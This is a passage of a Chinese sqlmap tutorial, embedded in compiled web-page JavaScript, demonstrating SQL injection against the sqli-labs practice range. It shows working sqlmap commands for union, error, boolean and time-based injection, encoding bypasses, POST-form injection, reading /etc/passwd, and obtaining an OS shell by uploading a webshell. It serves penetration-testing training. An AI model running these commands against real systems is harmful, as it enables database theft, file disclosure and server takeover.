"),s("p",[a._v("那么就可以通过指定"),s("code",[a._v("--dbms")]),a._v("参数，指定数据库类型为mysql，跳过其他数据库类型的检测，使用"),s("code",[a._v("--technique")]),a._v("参数，页面存在回显位，指定注入方式为联合注入")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/sqlmap/14.png",alt:"14"}})]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("sqlmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-u")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://192.168.6.112:8080/Less-1/?id=1"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--dbms")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("mysql "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--technique")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("U "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--dbs")]),a._v(" --flush-session "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--batch")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("sqlmap提示找到了注入点，给出了测试payload，但是后面说，在测试过程，没有拿到"),s("code",[a._v("--dbs")]),a._v("参数的结果，页面没有返回结果")]),a._v(" "),s("p",[a._v("但是可以使用"),s("code",[a._v("--no-cast")]),a._v("或者"),s("code",[a._v("--hex")]),a._v("参数，关闭mysql的类型转换或编码绕过。")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/sqlmap/15.png",alt:"15"}})]),a._v(" "),s("p",[a._v("通过把"),s("code",[a._v("-v")]),a._v("参数指定为6级，看看页面返回内容")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("sqlmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-u")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://192.168.6.112:8080/Less-1/?id=1"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--dbms")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("mysql "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--technique")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("U "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--dbs")]),a._v(" --flush-session "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--batch")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-v")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("6")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("老版本 MySQL 没有自动字符集转换机制，sqlmap的payload不兼容，mysql报错。")]),a._v(" "),s("div",{staticClass:"language-plaintext line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-plaintext"}},[s("code",[a._v("<font color= \"#FFFF00\">Illegal mix of collations (gbk_chinese_ci,IMPLICIT) and (latin1_swedish_ci,IMPLICIT) for operation 'UNION'</font></font> </div></br></br></br><center>\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[s("img",{attrs:{src:"/medias/sqlmap/16.png",alt:"16"}})]),a._v(" "),s("p",[a._v("尝试使用"),s("code",[a._v("--no-cast")]),a._v("参数，关闭mysql的类型转换，拿到数据")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("sqlmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-u")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://192.168.6.112:8080/Less-1/?id=1"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--dbms")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("mysql "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--technique")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("U "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--dbs")]),a._v(" --flush-session "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--batch")]),a._v(" --no-cast\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[s("img",{attrs:{src:"/medias/sqlmap/17.png",alt:"17"}})]),a._v(" "),s("p",[a._v("尝试使用"),s("code",[a._v("--hex")]),a._v("参数，使用十六进制编码绕过，也可以拿到数据")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("sqlmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-u")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://192.168.6.112:8080/Less-1/?id=1"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--dbms")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("mysql "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--technique")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("U "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--dbs")]),a._v(" --flush-session "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--batch")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--hex")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[s("img",{attrs:{src:"/medias/sqlmap/18.png",alt:"18"}})]),a._v(" "),s("p",[s("strong",[a._v("technique")]),a._v("参数还可以使用其他注入方式，"),s("code",[a._v("B")]),a._v("表示布尔盲注，"),s("code",[a._v("E")]),a._v("表示报错注入，"),s("code",[a._v("T")]),a._v("表示时间盲注")]),a._v(" "),s("p",[a._v("这道题比较简单，多种注入姿势都是可以的")]),a._v(" "),s("p",[a._v("速度排序：联合注入（U） > 报错注入（E） > 布尔盲注（B） > 时间盲注（T）")]),a._v(" "),s("p",[a._v("报错注入（E）：")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("sqlmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-u")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://192.168.6.112:8080/Less-1/?id=1"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--dbms")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("mysql "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--technique")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("E "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--dbs")]),a._v(" --flush-session "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--batch")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("布尔盲注（B）：")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("sqlmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-u")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://192.168.6.112:8080/Less-1/?id=1"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--dbms")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("mysql "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--technique")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("B "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--dbs")]),a._v(" --flush-session "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--batch")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("时间盲注（T）：")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("sqlmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-u")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://192.168.6.112:8080/Less-1/?id=1"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--dbms")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("mysql "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--technique")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("T "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--dbs")]),a._v(" --flush-session "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--batch")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("h3",{attrs:{id:"forms-data-r"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#forms-data-r"}},[a._v("#")]),a._v(" --forms,--data,-r")]),a._v(" "),s("p",[a._v("这里使用"),s("code",[a._v("Less-11")]),a._v("，这是一个POST请求方式的单引号类型sql注入点")]),a._v(" "),s("pre",[a._v("--forms  自动检测表单注入点\n--data   指定POST数据\n--r      从抓到的http包中提取参数\n")]),a._v(" "),s("p",[a._v("使用"),s("code",[a._v("--forms")]),a._v("参数，把工作直接交给sqlmap，让sqlmap自己探测要提交的表单参数，指定探测参数uname、联合注入，hex编码结果")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("sqlmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-u")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://192.168.6.112:8080/Less-11/?id=1"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--dbms")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("mysql "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--forms")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("uname")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--dbs")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--technique")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("U --flush-session "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--batch")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--hex")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("使用"),s("code",[a._v("--data")]),a._v("参数，指定POST数据，使用"),s("code",[a._v("-p")]),a._v("参数指定探测参数uname，在windows平台怪怪的，"),s("code",[a._v("&")]),a._v("字符有特殊语义")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("sqlmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-u")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://192.168.6.112:8080/Less-11/?id=1"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--dbms")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("mysql "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--data")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"passwd=1&submit=Submit&uname=1"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("uname")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--dbs")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--technique")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("U --flush-session "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--batch")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--hex")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("使用"),s("code",[a._v("-r")]),a._v("参数，从抓到的http包中提取参数，使用"),s("code",[a._v("-p")]),a._v("参数指定探测参数uname")]),a._v(" "),s("p",[a._v("先用burp抓个包，保存到一个txt文件里")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/sqlmap/21.png",alt:"21"}})]),a._v(" "),s("p",[a._v("复制文件的路径")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/sqlmap/22.png",alt:"22"}})]),a._v(" "),s("p",[a._v("使用sqlmap "),s("code",[a._v("-r")]),a._v("参数，指定抓包文件路径，使用"),s("code",[a._v("-p")]),a._v("参数指定探测参数uname")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("sqlmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-r")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"f:'),s("span",{pre:!0,attrs:{class:"token entity",title:"\\\\"}},[a._v("\\\\")]),a._v("Desktop"),s("span",{pre:!0,attrs:{class:"token entity",title:"\\\\"}},[a._v("\\\\")]),a._v('slq.txt"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--dbms")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("mysql "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("uname")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--dbs")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--technique")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("U --flush-session "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--batch")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--hex")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[s("img",{attrs:{src:"/medias/sqlmap/23.png",alt:"23"}})]),a._v(" "),s("h3",{attrs:{id:"file-read-os-shell-sql-shell-output-dir"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#file-read-os-shell-sql-shell-output-dir"}},[a._v("#")]),a._v(" --file-read,--os-shell,--sql-shell,--output-dir")]),a._v(" "),s("p",[a._v("回到"),s("code",[a._v("Less-1")]),a._v("这一关演示。")]),a._v(" "),s("pre",[a._v("--file-read  读取服务器文件（使用了mysql的load_file函数）\n--os-shell   获得一个交互的shell（上传一个webshell，在结束命令执行时，删除自身）\n--sql-shell  获得一个交互的sqlshell（可以执行sql语句）\n")]),a._v(" "),s("p",[a._v("使用"),s("code",[a._v("--file-read")]),a._v("参数，读取服务器文件")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("sqlmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-u")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://192.168.6.112:8080/Less-1/?id=1"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("id")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--dbms")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("mysql --file-read"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("/etc/passwd --flush-session "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--batch")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("读取成功，使用了16进制进行了一次编码，同时保存了一份解码文件在本地的C盘用户目录下")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/sqlmap/24.png",alt:"24"}})]),a._v(" "),s("p",[a._v("可以使用"),s("code",[a._v("--output-dir")]),a._v("参数，指定输出目录在桌面，我的终端在桌面打开的，直接指定当前目录了")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("sqlmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-u")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://192.168.6.112:8080/Less-1/?id=1"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("id")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--dbms")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("mysql --file-read"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("/etc/passwd --flush-session "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--batch")]),a._v(" --output-dir"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("./\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[s("img",{attrs:{src:"/medias/sqlmap/25.png",alt:"25"}})]),a._v(" "),s("p",[a._v("尝试写入webshell，这个靶场有点问题，进入docker内，授权写权限")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[a._v("docker")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("exec")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-it")]),a._v(" sqli-lab /bin/sh\n"),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("chmod")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("777")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-R")]),a._v(" /var/www/html/\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br")])]),s("p",[a._v("使用"),s("code",[a._v("--os-shell")]),a._v("参数，获得一个交互的shell，")]),s("p",{attrs:{color:"red"}},[a._v("注意：这个过程会上传webshell，如果你需要手动指定目录时，不要使用--batch参数，如果是常见的/var/www/html/目录，sqlmap可以自动尝试上传到这个目录下")]),s("p"),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("sqlmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-u")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://192.168.6.112:8080/Less-1/?id=1"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("id")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--dbms")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("mysql --os-shell --flush-session "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--batch")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("退出这个webshell后，这个webshell会自动删除自身")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/sqlmap/26.png",alt:"26"}})]),a._v(" "),s("p",[a._v("使用"),s("code",[a._v("--sql-shell")]),a._v("参数，获得一个交互的sqlshell")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("sqlmap "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-u")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://192.168.6.112:8080/Less-1/?id=1"')]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("id")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--dbms")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("mysql --sql-shell --flush-session "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--batch")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("拿到了sqlshell，可以执行sql语句，当前是mysql的root用户")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/sqlmap/27.png",alt:"27"}})])])}),[],!1,null,null,null);s.default=r.exports}}]);